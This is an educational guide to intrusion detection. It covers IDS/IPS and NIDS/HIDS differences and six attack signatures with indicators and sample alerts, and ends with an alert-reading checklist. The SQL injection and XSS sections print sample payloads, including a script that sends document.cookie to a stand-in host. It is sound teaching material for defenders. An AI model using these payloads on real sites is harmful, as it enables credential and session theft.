IDS vs. IPS

IDS sits out-of-band (a tap or span port), watches a copy of traffic, and alerts. IPS sits inline, in the live traffic path, and can block a connection in real time — detection plus enforcement.

NIDS vs. HIDS

NIDS (e.g., Suricata, Snort) inspects packets on the wire. HIDS (e.g., Wazuh, OSSEC) watches one host — auth logs, file integrity, processes. Network attacks show up in NIDS; credential and local attacks often show up in HIDS first.

Signature vs. Anomaly

Signature-based: matches a known-bad pattern — fast, precise, blind to new attacks. Anomaly-based: flags deviation from a learned baseline — catches novel attacks, needs tuning to avoid false positives.

The six signatures, in detail

01 / 06

Reconnaissance / Port Scanning

Detection modeSignature-based (rate rules assist)
Indicators
  • Single source → many destination ports/hosts, short window
  • SYN-only packets; three-way handshake never completes
  • Sequential or near-sequential port order
Sample alert
SCAN Nmap TCP Stealth Scan — 1,024 ports probed from one host in 4.9s; 0 completed handshakes
Not a flood: many ports at low volume — the goal is mapping services, not exhausting them.
02 / 06

Brute-Force / Credential Attack

Detection modeAnomaly-based (failed-auth threshold)
Indicators
  • Dozens+ failed logins, many different usernames
  • One source IP, compressed into a short window
  • Lives in the auth/application log, not packet captures
Sample alert
sshd: Failed password for invalid user admin from 198.51.100.77 — ×52 in 90s, 0 successes
Not a scan: this is application-layer authentication, not port probing.
03 / 06

Denial-of-Service (DoS/DDoS) Flood

Detection modeAnomaly-based (volumetric baseline)
Indicators
  • Extreme packet/connection rate to one destination port
  • Many (often spoofed) source addresses
  • Completed handshakes far below the SYN rate; CPU/latency spikes
Sample alert
DOS SYN Flood — 58,340 SYN/s to 10.10.5.20:443 vs. 12 completed handshakes; service degraded
Not a scan: one port, enormous volume — the goal is exhausting resources, not mapping them.
04 / 06

SQL Injection

Detection modeSignature-based (payload pattern match)
Indicators
  • SQL keywords/metacharacters in a request parameter
  • Comment terminators (--) truncating the real query
  • Known scanner/tool user-agent (e.g., sqlmap)
Sample alert
GET /products.php?id=15 UNION SELECT username,password,3,4 FROM users-- -
Not XSS: the payload targets the database backend, not the victim's browser.
05 / 06

Cross-Site Scripting (XSS)

Detection modeSignature-based (script/tag pattern match)
Indicators
  • <script> or event-handler payload in a request/response
  • URL-encoded HTML tags in a query string
  • Payload reads document.cookie or redirects off-site
Sample alert
GET /search.aspx?q=<script>document.location= 'http://evil.example/c?c='+document.cookie</script>
Not SQLi: the payload targets the browser/session, not the database.
06 / 06

ARP Spoofing / On-Path (MITM)

Detection modeAnomaly-based (L2 binding change)
Indicators
  • One IP (often the gateway) resolves to two+ MAC addresses
  • Rapid "flip-flop" between MACs from gratuitous ARP replies
  • Confined to the local wired/wireless segment — not routable
Sample alert
arpwatch: flip flop 10.10.30.1 00:1A:2B:3C:4D:5E (was AA:BB:CC:11:22:33)
Different layer entirely: Layer 2 addressing, not ports, payloads, or volume.

Reading any alert: a 6-question checklist

  1. Source & destinationWho's talking to whom? Internal, external, or both? Is that pairing expected?
  2. Port(s) & protocolOne port repeatedly, or many in sequence? Is it the standard service for that port?
  3. Flags / handshakeDid the connection complete, or is it SYN-only / half-open?
  4. Payload / contentAny recognizable attack syntax, script tags, or known tool signatures?
  5. Volume & timingHow much traffic, how fast, from how many sources, over what window?
  6. LayerIs this Layer 2 (MAC/ARP), Layer 3–4 (IP/port), or Layer 7 (application/HTTP)?
